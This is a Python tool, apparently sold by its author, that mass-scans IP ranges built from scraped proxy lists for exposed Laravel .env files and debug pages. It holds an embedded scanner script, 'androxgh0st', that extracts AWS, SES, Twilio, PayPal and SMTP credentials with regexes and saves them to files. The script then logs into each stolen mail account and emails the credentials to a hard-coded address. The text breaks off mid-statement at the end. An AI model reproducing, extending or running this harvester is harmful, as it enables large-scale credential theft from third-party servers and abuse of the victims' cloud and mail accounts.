#COPYRIGHT GOES TO @Nyx_FallagaTn
# If you want to edit the script , contact me and i will give you permission for it , Happy Cracking :) 
# let's hack the world together :) 
# Paid NOT FOR FREE !!! 
import sys
import os
import ctypes
import requests
from re import findall as reg , compile , match
from colorama import Fore as F
import time
from multiprocessing.dummy import Pool
import console
import base64

Headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 "
}

rc = 0

laravelNYX = '''# -*- coding: utf-8 -*-
import requests, os, sys
from re import findall as reg
requests.packages.urllib3.disable_warnings()
from threading import *
from threading import Thread
import configparser
import queue
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import concurrent.futures
import smtplib
from socket import gaierror
from colorama import Fore as F
import console
try:
    fsetting = open('sendto.ini', 'r').read()
except:
    open('sendto.ini','a').write('fyraszx232@yahoo.com')

list_region = """us-east-1
us-east-2
us-west-1
us-west-2
af-south-1
ap-east-1
ap-south-1
ap-northeast-1
ap-northeast-2
ap-northeast-3
ap-southeast-1
ap-southeast-2
ca-central-1
eu-central-1
eu-west-1
eu-west-2
eu-west-3
eu-south-1
eu-north-1
me-south-1
sa-east-1"""
pid_restore = '.nero_swallowtail'
def sendtest(url,host,port,user,passw,sender):
    if "465" in str(port):
        port = "587"
    else:
        port = str(port)
    if "unknown@unknown.com" in sender and "@" in user:
        sender_email = user
    else:
        sender_email = str(sender.replace('\\"',''))
    smtp_server = str(host)
    login = str(user.replace('\\"',''))
    password = str(passw.replace('\\"',''))
    receiver_email = str(fsetting)
    message = MIMEMultipart("alternative")
    message["Subject"] = "NYX SMTP CRACK | HOST: "+str(host)
    if "zoho" in host:
        message["From"] = user
    else:
        message["From"] = sender_email
    message["To"] = receiver_email
    text = """    """
    html = f"""    <html>
        <body>
            <p>-------------------</p>
            <p>URL    : {url}</p>
            <p>HOST   : {host}</p>
            <p>PORT   : {port}</p>
            <p>USER   : {user}</p>
            <p>PASSW  : {passw}</p>
            <p>SENDER : {sender}</p>
            <p>-------------------</p>
        </body>
    </html>
    """
    part1 = MIMEText(text, "plain")
    part2 = MIMEText(html, "html")
    message.attach(part1)
    message.attach(part2)

    try:
        s = smtplib.SMTP(smtp_server, port)
        s.connect(smtp_server,port)
        s.ehlo()
        s.starttls()
        s.ehlo()
        s.login(login, password)
        s.sendmail(sender_email, receiver_email, message.as_string())
        print(f'{F.LIGHTGREEN_EX}[SMTP SEND INFO] Sent To {F.LIGHTWHITE_EX}'+str(fsetting))

    except (gaierror, ConnectionRefusedError):
        print(f'{F.LIGHTRED_EX}[SMTP SEND INFO] Failed to connect to the server{F.LIGHTWHITE_EX}')
        pass
    except smtplib.SMTPServerDisconnected:
        print(f'{F.LIGHTRED_EX}[SMTP SEND INFO] Failed to connect to the server{F.LIGHTWHITE_EX}')
        pass
    except smtplib.SMTPException as e:
        print(f'{F.LIGHTRED_EX}[SMTP SEND INFO] SMTP ERROR {F.LIGHTWHITE_EX}')
        pass
class Worker(Thread):
    def __init__(self, tasks):
        Thread.__init__(self)
        self.tasks = tasks
        self.daemon = True
        self.start()

    def run(self):
        while True:
            func, args, kargs = self.tasks.get()
            try: func(*args, **kargs)
            except Exception as e:
                print(e)
            self.tasks.task_done()

class ThreadPool:
    def __init__(self, num_threads):
        self.tasks = queue(num_threads)
        for _ in range(num_threads): Worker(self.tasks)

    def add_task(self, func, *args, **kargs):
        self.tasks.put((func, args, kargs))

    def wait_completion(self):
        self.tasks.join()

class androxgh0st:
    def paypal(self, text, url):
        if "PAYPAL_" in text:
            save = open('paypal_sandbox.txt','a')
            save.write(url+'\\n')
            save.close()
            return True
        else:
            return False

    def get_aws_region(self, text):
        reg = False
        for region in list_region.splitlines():
            if str(region) in text:
                return region
                break

    def get_aws_data(self, text, url):
        try:
            if "AWS_ACCESS_KEY_ID" in text:
                if "AWS_ACCESS_KEY_ID=" in text:
                    method = '/.env'
                    try:
                        aws_key = reg("\\nAWS_ACCESS_KEY_ID=(.*?)\\n", text)[0]
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg("\\nAWS_SECRET_ACCESS_KEY=(.*?)\\n", text)[0]
                    except:
                        aws_sec = ''
                    try:
                        asu = androxgh0st().get_aws_region(text)
                        if asu:
                            aws_reg = asu
                        else:
                            aws_reg = ''
                    except:
                        aws_reg = ''
                elif "<td>AWS_ACCESS_KEY_ID</td>" in text:
                    method = 'debug'
                    try:
                        aws_key = reg("<td>AWS_ACCESS_KEY_ID<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", text)[0]
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg("<td>AWS_SECRET_ACCESS_KEY<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", text)[0]
                    except:
                        aws_sec = ''
                    try:
                        asu = androxgh0st().get_aws_region(text)
                        if asu:
                            aws_reg = asu
                        else:
                            aws_reg = ''
                    except:
                        aws_reg = ''
                if aws_reg == "":
                    aws_reg = "aws_unknown_region--"
                if aws_key == "" and aws_sec == "":
                    return False
                else:
                    build = 'URL: '+str(url)+'\\nMETHOD: '+str(method)+'\\nAWS ACCESS KEY: '+str(aws_key)+'\\nAWS SECRET KEY: '+str(aws_sec)+'\\nAWS REGION: '+str(aws_reg)+'\\nAWS BUCKET: '
                    remover = str(build).replace('\\r', '')
                    save = open(str(aws_reg)[:-2]+'.txt', 'a')
                    save.write(remover+'\\n\\n')
                    save.close()
                    remover = str(build).replace('\\r', '')
                    save2 = open('aws_access_key_secret.txt', 'a')
                    save2.write(remover+'\\n\\n')
                    save2.close()
                return True
            elif "AWS_KEY" in text:
                if "AWS_KEY=" in text:
                    method = '/.env'
                    try:
                        aws_key = reg("\\nAWS_KEY=(.*?)\\n", text)[0]
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg("\\nAWS_SECRET=(.*?)\\n", text)[0]
                    except:
                        aws_sec = ''
                    try:
                        asu = androxgh0st().get_aws_region(text)
                        if asu:
                            aws_reg = asu
                        else:
                            aws_reg = ''
                    except:
                        aws_reg = ''
                    try:
                        aws_buc = reg("\\nAWS_BUCKET=(.*?)\\n", text)[0]
                    except:
                        aws_buc = ''
                elif "<td>AWS_KEY</td>" in text:
                    method = 'debug'
                    try:
                        aws_key = reg("<td>AWS_KEY<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", text)[0]
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg("<td>AWS_SECRET<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", text)[0]
                    except:
                        aws_sec = ''
                    try:
                        asu = androxgh0st().get_aws_region(text)
                        if asu:
                            aws_reg = asu
                        else:
                            aws_reg = ''
                    except:
                        aws_reg = ''
                    try:
                        aws_buc = reg("<td>AWS_BUCKET<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", text)[0]
                    except:
                        aws_buc = ''
                if aws_reg == "":
                    aws_reg = "aws_unknown_region--"
                if aws_key == "" and aws_sec == "":
                    return False
                else:
                    build = 'URL: '+str(url)+'\\nMETHOD: '+str(method)+'\\nAWS ACCESS KEY: '+str(aws_key)+'\\nAWS SECRET KEY: '+str(aws_sec)+'\\nAWS REGION: '+str(aws_reg)+'\\nAWS BUCKET: '+str(aws_buc)
                    remover = str(build).replace('\\r', '')
                    save = open(str(aws_reg)[:-2]+'.txt', 'a')
                    save.write(remover+'\\n\\n')
                    save.close()
                    remover = str(build).replace('\\r', '')
                    save2 = open('aws_access_key_secret.txt', 'a')
                    save2.write(remover+'\\n\\n')
                    save2.close()
                return True
            elif "SES_KEY" in text:
                if "SES_KEY=" in text:
                    method = '/.env'
                    try:
                       aws_key = reg("\\nSES_KEY=(.*?)\\n", text)[0]
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg("\\nSES_SECRET=(.*?)\\n", text)[0]
                    except:
                        aws_sec = ''
                    try:
                        asu = androxgh0st().get_aws_region(text)
                        if asu:
                            aws_reg = asu
                        else:
                            aws_reg = ''
                    except:
                        aws_reg = ''
                elif "<td>SES_KEY</td>" in text:
                    method = 'debug'
                    try:
                        aws_key = reg("<td>SES_KEY<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", text)[0]
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg("<td>SES_SECRET<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", text)[0]
                    except:
                        aws_sec = ''
                    try:
                        asu = androxgh0st().get_aws_region(text)
                        if asu:
                            aws_reg = asu
                        else:
                            aws_reg = ''
                    except:
                        aws_reg = ''
                if aws_reg == "":
                    aws_reg = "aws_unknown_region--"
                if aws_key == "" and aws_sec == "":
                    return False
                else:
                    build = 'URL: '+str(url)+'\\nMETHOD: '+str(method)+'\\nAWS ACCESS KEY: '+str(aws_key)+'\\nAWS SECRET KEY: '+str(aws_sec)+'\\nAWS REGION: '+str(aws_reg)+'\\nAWS BUCKET: '
                    remover = str(build).replace('\\r', '')
                    save = open(str(aws_reg)[:-2]+'.txt', 'a')
                    save.write(remover+'\\n\\n')
                    save.close()
                    remover = str(build).replace('\\r', '')
                    save2 = open('aws_access_key_secret.txt', 'a')
                    save2.write(remover+'\\n\\n')
                    save2.close()
                return True
            else:
                return False
        except:
            return False

    def get_twillio(self, text, url):
        try:
            if "TWILIO" in text:
                if "TWILIO_ACCOUNT_SID=" in text:
                    method = '/.env'
                    try:
                        acc_sid = reg('\\nTWILIO_ACCOUNT_SID=(.*?)\\n', text)[0]
                    except:
                        acc_sid = ''
                    try:
                        acc_key = reg('\\nTWILIO_API_KEY=(.*?)\\n', text)[0]
                    except:
                        acc_key = ''
                    try:
                        sec = reg('\\nTWILIO_API_SECRET=(.*?)\\n', text)[0]
                    except:
                        sec = ''
                    try:
                        chatid = reg('\\nTWILIO_CHAT_SERVICE_SID=(.*?)\\n', text)[0]
                    except:
                        chatid = ''
                    try:
                        phone = reg('\\nTWILIO_NUMBER=(.*?)\\n', text)[0]
                    except:
                        phone = ''
                    try:
                        auhtoken = reg('\\nTWILIO_AUTH_TOKEN=(.*?)\\n', text)[0]
                    except:
                        auhtoken = ''
                elif '<td>TWILIO_ACCOUNT_SID</td>' in text:
                    method = 'debug'
                    try:
                        acc_sid = reg('<td>TWILIO_ACCOUNT_SID<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
                    except:
                        acc_sid = ''
                    try:
                        acc_key = reg('<td>TWILIO_API_KEY<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
                    except:
                        acc_key = ''
                    try:
                        sec = reg('<td>TWILIO_API_SECRET<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
                    except:
                        sec = ''
                    try:
                        chatid = reg('<td>TWILIO_CHAT_SERVICE_SID<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
                    except:
                        chatid = ''
                    try:
                        phone = reg('<td>TWILIO_NUMBER<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
                    except:
                        phone = ''
                    try:
                        auhtoken = reg('<td>TWILIO_AUTH_TOKEN<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
                    except:
                        auhtoken = ''
                build = 'URL: '+str(url)+'\\nMETHOD: '+str(method)+'\\nTWILIO_ACCOUNT_SID: '+str(acc_sid)+'\\nTWILIO_API_KEY: '+str(acc_key)+'\\nTWILIO_API_SECRET: '+str(sec)+'\\nTWILIO_CHAT_SERVICE_SID: '+str(chatid)+'\\nTWILIO_NUMBER: '+str(phone)+'\\nTWILIO_AUTH_TOKEN: '+str(auhtoken)
                remover = str(build).replace('\\r', '')
                save = open('TWILLIO.txt', 'a')
                save.write(remover+'\\n\\n')
                save.close()
                return True
            else:
                return False
        except:
            return False
    def get_smtp(self, text, url):
        try:
            if "MAIL_HOST" in text:
                if "MAIL_HOST=" in text:
                    method = '/.env'
                    mailhost = reg("\\nMAIL_HOST=(.*?)\\n", text)[0]
                    mailport = reg("\\nMAIL_PORT=(.*?)\\n", text)[0]
                    mailuser = reg("\\nMAIL_USERNAME=(.*?)\\n", text)[0]
                    mailpass = reg("\\nMAIL_PASSWORD=(.*?)\\n", text)[0]
                    try:
                        mailfrom = reg("\\nMAIL_FROM_ADDRESS=(.*?)\\n", text)[0]
                    except:
                        mailfrom = ''
                    try:
                        fromname = reg("\\nMAIL_FROM_NAME=(.*?)\\n", text)[0]
                    except:
                        fromname = ''
                elif "<td>MAIL_HOST</td>" in text:
                    method = 'debug'
                    mailhost = reg('<td>MAIL_HOST<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
                    mailport = reg('<td>MAIL_PORT<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
                    mailuser = reg('<td>MAIL_USERNAME<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
                    mailpass = reg('<td>MAIL_PASSWORD<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
                    try:
                        mailfrom = reg("<td>MAIL_FROM_ADDRESS<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", text)[0]
                    except:
                        mailfrom = ''
                    try:
                        fromname = reg("<td>MAIL_FROM_NAME<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", text)[0]
                    except:
                        fromname = ''
                if mailuser == "null" or mailpass == "null" or mailuser == "" or mailpass == "":
                    return False
                else:
                    # mod aws
                    if '.amazonaws.com' in mailhost:
                        getcountry = reg('email-smtp.(.*?).amazonaws.com', mailhost)[0]
                        build = 'URL: '+str(url)+'\\nMETHOD: '+str(method)+'\\nMAILHOST: '+str(mailhost)+'\\nMAILPORT: '+str(mailport)+'\\nMAILUSER: '+str(mailuser)+'\\nMAILPASS: '+str(mailpass)+'\\nMAILFROM: '+str(mailfrom)+'\\nFROMNAME: '+str(fromname)
                        remover = str(build).replace('\\r', '')
                        save = open(getcountry[:-2]+'.txt', 'a')
                        save.write(remover+'\\n\\n')
                        save.close()
                        remover = str(build).replace('\\r', '')
                        save2 = open('SMTP_RANDOM.txt', 'a')
                        save2.write(remover+'\\n\\n')
                        save2.close()
                    elif 'sendgrid' in mailhost:
                        build = 'URL: '+str(url)+'\\nMETHOD: '+str(method)+'\\nMAILHOST: '+str(mailhost)+'\\nMAILPORT: '+str(mailport)+'\\nMAILUSER: '+str(mailuser)+'\\nMAILPASS: '+str(mailpass)+'\\nMAILFROM: '+str(mailfrom)+'\\nFROMNAME: '+str(fromname)
                        remover = str(build).replace('\\r', '')
                        save = open('SMTP_RANDOM.txt', 'a')
                        save.write(remover+'\\n\\n')
                        save.close()
                    elif 'office365' in mailhost:
                        build = 'URL: '+str(url)+'\\nMETHOD: '+str(method)+'\\nMAILHOST: '+str(mailhost)+'\\nMAILPORT: '+str(mailport)+'\\nMAILUSER: '+str(mailuser)+'\\nMAILPASS: '+str(mailpass)+'\\nMAILFROM: '+str(mailfrom)+'\\nFROMNAME: '+str(fromname)
                        remover = str(build).replace('\\r', '')
                        save = open('SMTP_RANDOM.txt', 'a')
                        save.write(remover+'\\n\\n')
                        save.close()
                    elif '1and1' in mailhost or '1und1' in mailhost:
                        build = 'URL: '+str(url)+'\\nMETHOD: '+str(method)+'\\nMAILHOST: '+str(mailhost)+'\\nMAILPORT: '+str(mailport)+'\\nMAILUSER: '+str(mailuser)+'\\nMAILPASS: '+str(mailpass)+'\\nMAILFROM: '+str(mailfrom)+'\\nFROMNAME: '+str(fromname)
                        remover = str(build).replace('\\r', '')
                        save = open('SMTP_RANDOM.txt', 'a')
                        save.write(remover+'\\n\\n')
                        save.close()
                    elif 'zoho' in mailhost:
                        build = 'URL: '+str(url)+'\\nMETHOD: '+str(method)+'\\nMAILHOST: '+str(mailhost)+'\\nMAILPORT: '+str(mailport)+'\\nMAILUSER: '+str(mailuser)+'\\nMAILPASS: '+str(mailpass)+'\\nMAILFROM: '+str(mailfrom)+'\\nFROMNAME: '+str(fromname)
                        remover = str(build).replace('\\r', '')
                        save = open('SMTP_RANDOM.txt', 'a')
                        save.write(remover+'\\n\\n')
                        save.close()
                    elif 'mandrillapp' in mailhost:
                        build = 'URL: '+str(url)+'\\nMETHOD: '+str(method)+'\\nMAILHOST: '+str(mailhost)+'\\nMAILPORT: '+str(mailport)+'\\nMAILUSER: '+str(mailuser)+'\\nMAILPASS: '+str(mailpass)+'\\nMAILFROM: '+str(mailfrom)+'\\nFROMNAME: '+str(fromname)
                        remover = str(build).replace('\\r', '')
                        save = open('SMTP_RANDOM.txt', 'a')
                        save.write(remover+'\\n\\n')
                        save.close()
                    elif 'mailgun' in mailhost:
                        build = 'URL: '+str(url)+'\\nMETHOD: '+str(method)+'\\nMAILHOST: '+str(mailhost)+'\\nMAILPORT: '+str(mailport)+'\\nMAILUSER: '+str(mailuser)+'\\nMAILPASS: '+str(mailpass)+'\\nMAILFROM: '+str(mailfrom)+'\\nFROMNAME: '+str(fromname)
                        remover = str(build).replace('\\r', '')
                        save = open('SMTP_RANDOM.txt', 'a')
                        save.write(remover+'\\n\\n')
                        save.close()
                    else:
                        build = 'URL: '+str(url)+'\\nMETHOD: '+str(method)+'\\nMAILHOST: '+str(mailhost)+'\\nMAILPORT: '+str(mailport)+'\\nMAILUSER: '+str(mailuser)+'\\nMAILPASS: '+str(mailpass)+'\\nMAILFROM: '+str(mailfrom)+'\\nFROMNAME: '+str(fromname)
                        remover = str(build).replace('\\r', '')
                        save = open('SMTP_RANDOM.txt', 'a')
                        save.write(remover+'\\n\\n')
                        save.close()
                    sendtest(url,mailhost,mailport,mailuser,mailpass,mailfrom)
                    return True
            else:
                return False
        except:
            return False

def printf(text):
    ''.join([str(item) for item in text])
    print(text + '\\n'),

def main(url):
    if "://" in url:
        url = url
    else:
        url = "http://"+url
    if url.endswith('/'):
        url = url[:-1]
    resp = False
    try:
        text = f'{F.LIGHTGREEN_EX}#{F.LIGHTWHITE_EX} '+url
        headers = {'User-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'}
        get_source = requests.get(url+"/.env", headers=headers, timeout=5, verify=False, allow_redirects=False).text
        if "APP_KEY=" in get_source:
            resp = get_source
        else:
            get_source = requests.post(url, data={"0x[]":"androxgh0st"}, headers=headers, timeout=8, verify=False, allow_redirects=False).text
            if "<td>APP_KEY</td>" in get_source:
                resp = get_source
        if resp:
            getsmtp = androxgh0st().get_smtp(resp, url)
            getwtilio = androxgh0st().get_twillio(resp, url)
            getaws = androxgh0st().get_aws_data(resp, url)
            getpp = androxgh0st().paypal(resp, url)
            if getsmtp:
                text += f' | {F.LIGHTGREEN_EX}SMTP{F.LIGHTWHITE_EX}'
            else:
                text += f' | {F.LIGHTRED_EX}SMTP{F.LIGHTWHITE_EX}'
            if getaws:
                text += f' | {F.LIGHTGREEN_EX}AWS{F.LIGHTWHITE_EX}'
            else:
                text += f' | {F.LIGHTRED_EX}AWS{F.LIGHTWHITE_EX}'
            if getwtilio:
                text += f' | {F.LIGHTGREEN_EX}TWILIO{F.LIGHTWHITE_EX}'
            else:
                text += f' | {F.LIGHTRED_EX}TWILIO{F.LIGHTWHITE_EX}'
            if getpp:
                text += f' | {F.LIGHTGREEN_EX}PAYPAL{F.LIGHTWHITE_EX}'
            else:
                text += f' | {F.LIGHTRED_EX}PAYPAL{F.LIGHTWHITE_EX}'
        else:
            text += f" | {F.LIGHTRED_EX}Can't get everything{F.LIGHTWHITE_EX}"
    except:
        text = f'{F.LIGHTRED_EX}#{F.LIGHTWHITE_EX} '+url
        text += f" | {F.LIGHTRED_EX}Can't access sites{F.LIGHTWHITE_EX}"
    printf(text)

if __name__ == '__main__':
    print(f"""{F.LIGHTRED_EX}
            ███╗   ██╗██╗   ██╗██╗  ██╗
            ████╗  ██║╚██╗ ██╔╝╚██╗██╔╝
            ██╔██╗ ██║ ╚████╔╝  ╚███╔╝ 
            ██║╚██╗██║  ╚██╔╝   ██╔██╗ 
            ██║ ╚████║   ██║   ██╔╝ ██╗
            ╚═╝  ╚═══╝   ╚═╝   ╚═╝  ╚═╝{F.LIGHTWHITE_EX}

        {F.LIGHTBLUE_EX}TELEGRAM :{F.LIGHTWHITE_EX} https://t.me/Nyx_FALLAGATN
        {F.LIGHTGREEN_EX}ICQ :{F.LIGHTWHITE_EX} https://icq.im/Nyx_FallagaTN 
    \\n""")
    try:
        readcfg = configparser()
        readcfg.read(pid_restore)
        lists = readcfg.get('DB', 'FILES')
        numthread = readcfg.get('DB', 'THREAD')
        sessi = readcfg.get('DB', 'SESSION')
        print("log session bot found! restore session")
        print("""Using Configuration :\\n	FILES="""+lists+"""\\n	THREAD="""+numthread+"""\\n	SESSION="""+sessi)
        tanya = input("Want to contineu session ? [Y/n] ")
        if "Y" in tanya or "y" in tanya:
            lerr = open(lists).read().split("\\n"+sessi)[1]
            readsplit = lerr.splitlines()
        else:
            print(Exception)
    except:
        try:
            lists = sys.argv[1]
            numthread = sys.argv[2]
            readsplit = open(lists).read().splitlines()
        except:
            try:
                lists = input("websitelist ? ")
                readsplit = open(lists).read().splitlines()
            except:
                print("Wrong input or list not found!")
                exit()
            try:
                numthread = input("threads ? ")
            except:
                print("Wrong thread number!")
                exit()
    try:
        with concurrent.futures.ThreadPoolExecutor(int(numthread)) as executor:
            executor.map(main,readsplit)
    except Exception as e:
        print(e)
'''


def logo():
    print(f"""{F.LIGHTRED_EX}
            ███╗   ██╗██╗   ██╗██╗  ██╗
            ████╗  ██║╚██╗ ██╔╝╚██╗██╔╝
            ██╔██╗ ██║ ╚████╔╝  ╚███╔╝ 
            ██║╚██╗██║  ╚██╔╝   ██╔██╗ 
            ██║ ╚████║   ██║   ██╔╝ ██╗
            ╚═╝  ╚═══╝   ╚═╝   ╚═╝  ╚═╝{F.LIGHTWHITE_EX}

        {F.LIGHTBLUE_EX}TELEGRAM :{F.LIGHTWHITE_EX} https://t.me/Nyx_FallagaTN 
        {F.LIGHTGREEN_EX}ICQ :{F.LIGHTWHITE_EX} https://icq.im/Nyx_FallagaTN 
    \n""")

def progress_bar(current, total, bar_length=40):
    fraction = current / total

    arrow = int(fraction * bar_length - 1) * '-' + '>'
    padding = int(bar_length - len(arrow)) * ' '

    ending = '\n' if current == total else '\r'

    print(f'\rRANGING: [{arrow}{padding}] {int(fraction*100)}%', end=ending)

def checkfolfil():
    if not os.path.isfile('laravelNYX.py'):
        with open('laravelNYX.py', 'w', encoding='UTF-8') as f:
            f.write(laravelNYX)

def splitter():
    splitLen = 2500000
    input = open('range.txt', 'r').read().splitlines()
    at = 1
    for lines in range(0, len(input), splitLen):
        outputData = input[lines:lines+splitLen]
        output = open(str(at) + '.txt', 'w')
        output.write('\n'.join(outputData))
        output.close()
        at += 1

def prxscrp():
    global rangecount
    headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36'}
    dd = []
    url ='https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all'
    req = requests.get(url).text
    ips = reg('(.*?)\r\n',req)
    ips = [str(ips).split(':')[0] for ips in ips ]
    for i in ips:dd.append(i)
    url ='https://www.sslproxies.org/'
    req = requests.get(url).text
    ips = reg('<tr><td>(.*?)</td>',req)
    ips = [ips for ips in ips if '-' not in str(ips)]
    for i in ips:dd.append(i)
    url ='https://free-proxy-list.net/'
    req = requests.get(url).text
    ips = reg('<tr><td>(.*?)</td>',req)
    ips = [ips for ips in ips if '-' not in str(ips)]
    for i in ips:dd.append(i)
    page = 1
    while True:
        url ='https://advanced.name/freeproxy?page={}'.format(page)
        req =requests.get(url).text
        ips = reg('<td data-ip="(.*?)">',req)
        if str(ips) =='[]':break
        ips = [base64.b64decode(ips) for ips in ips]
        ips = [str(ips).replace("b'",'').replace("'",'') for ips in ips]
        for i in ips:dd.append(i)
        page +=1
    url ='https://hidemy.name/en/proxy-list/?country=ARAMAUATBDBYBZBOBRKHCACNCOCWCYCZDOECEGFRDEHKINIDIRIEJPKZKRMXNLPYPEPHPLRORUSGZAESCHTWTJTTTRUAGBUSVEVNVG&type=hs&anon=4#list'
    req = requests.get(url,headers=headers).text
    ips = reg('<tr><td>(.*?)</td>',req)
    ips = [ips for ips in ips if '.' in str(ips)]
    for i in ips:dd.append(i)
    url ='https://openproxy.space/list/http'
    req = requests.get(url).text
    ips = reg('"(.*?)"',req)
    ips = [ips for ips in ips if match('^(?:(\w+)(?::(\w+))?@)?((?:\d{1,3})(?:\.\d{1,3}){3})(?::(\d{1,5}))?',ips)]
    ips = [str(ips).split(':')[0] for ips in ips]
    for i in ips:dd.append(i)
    url ='https://www.proxy-list.download/api/v2/get?l=en&t=http'
    req = requests.get(url).text
    ips =reg('"IP": "(.*?)"',req)
    for i in ips:dd.append(i)
    url ='https://spys.one/en/http-proxy-list/'
    data = {
        'xx0': '89482220d4de3ac1c8adc358db15114e',
        'xpp': '5',
        'xf1': '0',
        'xf2': '0',
        'xf4': '0',
        'xf5': '0'
    }
    req = requests.post(url,headers=headers, data =data).text
    ips = reg('<font class=spy14>(.*?)<script',req)
    ipl = []
    for i in ips:
        ip = compile(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})').search(str(i))
        ipx = reg("match='(.*?)'",str(ip))[0]
        ipl.append(str(ipx))
    for i in ipl:dd.append(i)
    dd = [*set(dd)]
    xx = []
    for x in dd:
        aze = str(x).split('.')
        rez = '{}.{}.0.0'.format(aze[0],aze[1])
        xx.append(rez)
    xx = [*set(xx)]
    rangecount = len(xx) * 65025
    for x in xx:
        open('ips_grabbed.txt','a').write(x + '\n')
    print('{}[{} # {}] Grabbed IPS : {}{}\n{}[{} # {}] Total Range count : {}{}\n{}[{} # {}] Starting Ranging...\n'.format(F.LIGHTWHITE_EX,F.LIGHTBLUE_EX,F.LIGHTWHITE_EX,F.LIGHTGREEN_EX,len(xx),F.LIGHTWHITE_EX,F.LIGHTBLUE_EX,F.LIGHTWHITE_EX,F.LIGHTGREEN_EX,rangecount,F.LIGHTWHITE_EX,F.LIGHTBLUE_EX,F.LIGHTWHITE_EX))
    time.sleep(1)

def laravelcheck():
    i = 1
    while True:
        if os.path.isfile('{}.txt'.format(i)):
            os.system('start cmd /k py -3 laravelNYX.py {}.txt 400'.format(i))
            i += 1
        else:
            break

def ranger(ip):
    global rc
    ip = ip.split('.')
    ww = ip[0] + '.' + ip[1] + '.'
    for i in range(0, 255):
        for j in range(0, 255):
            rez = ww + str(i + 1) + '.' + str(j + 1)
            with open('range.txt', 'a', encoding='UTF-8') as f:
                f.write(rez + '\n')
                rc += 1
                progress_bar(rc,rangecount)

def auto():
    os.system('cls')
    logo()
    checkfolfil()
    print('{}[{} # {}] Grabbing Ips ...'.format(F.LIGHTWHITE_EX,F.LIGHTGREEN_EX,F.LIGHTWHITE_EX))
    prxscrp()
    ips = open('ips_grabbed.txt', 'r').read().splitlines()
    os.remove('ips_grabbed.txt')
    Pool(35).map(ranger,ips)
    splitter()
    time.sleep(10)
    laravelcheck()
    time.sleep(10)
    os.remove('range.txt')
    i = 1
    while True:
        if os.path.isfile('{}.txt'.format(i)):
            os.remove('{}.txt'.format(i))
            i += 1
        else:
            break
    

def manual():
    open('ipsrez.txt', 'a')
    os.system('cls')
    logo()
    checkfolfil()
    ips = open(input('LIST=> '), 'r', encoding='utf-8').read().splitlines()
    for i in ips:
        if compile(".*\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}").match(i):
            i = i.split('.')
            rez = i[0] + '.' + i[1] + '.0.0'
            check = list(x.strip() for x in open('ipsrez.txt', 'r', encoding='UTF-8').readlines())
            count = 0
            for cc in check:
                if str(cc) == str(rez):
                    count += 1
            if count == 0:
                with open('ipsrez.txt', 'a', encoding='UTF-8') as f:
                    print('> ' + rez)
                    f.write(rez + '\n')
    qsdiaidha = open('ipsrez.txt', 'r').read().splitlines()
    os.remove('ipsrez.txt')
    Pool(35).map(ranger,qsdiaidha)
    splitter()
    time.sleep(10)
    laravelcheck()

def smtpcracker():
    os.system('cls')
    logo()
    checkfolfil()
    list = open(input('{}[{} # {}] List = > '.format(F.LIGHTWHITE_EX,F.LIGHTRED_EX,F.LIGHTWHITE_EX)),'r',encoding='UTF-8').read().splitlines()
    splitLen = int(input('{}[{} # {}] split number = > '.format(F.LIGHTWHITE_EX,F.LIGHTRED_EX,F.LIGHTWHITE_EX)))
    at = 1
    for lines in range(0, len(list), splitLen):
        outputData = list[lines:lines+splitLen]
        output = open(str(at) + '.txt', 'w')
        output.write('\n'.join(outputData))
        output.close()
        at += 1
    laravelcheck()

def main():
    logo()
    try:
        if sys.argv[1] =='--auto-Nyx_FallagaTn':
            auto()
    except:
        pass
    op = input(f"""
    {F.LIGHTGREEN_EX}[{F.LIGHTRED_EX} 1 {F.LIGHTGREEN_EX}]{F.LIGHTWHITE_EX} AUTO [ {F.LIGHTGREEN_EX}IPS GRABBER{F.LIGHTWHITE_EX} + {F.LIGHTRED_EX}RANGER{F.LIGHTWHITE_EX} + {F.LIGHTYELLOW_EX}CRACKER{F.LIGHTWHITE_EX} ]
    {F.LIGHTGREEN_EX}[{F.LIGHTRED_EX} 2 {F.LIGHTGREEN_EX}]{F.LIGHTWHITE_EX} MANUAL [ {F.LIGHTRED_EX}RANGER{F.LIGHTWHITE_EX} + {F.LIGHTYELLOW_EX}CRACKER{F.LIGHTWHITE_EX} ]
    {F.LIGHTGREEN_EX}[{F.LIGHTRED_EX} 3 {F.LIGHTGREEN_EX}]{F.LIGHTWHITE_EX} SMTP CRACKER 
    \n\n= > """)
    if op == '1':
        auto()
    elif op == '2':
        manual()
    elif op =='3':
        smtpcracker()
    else:
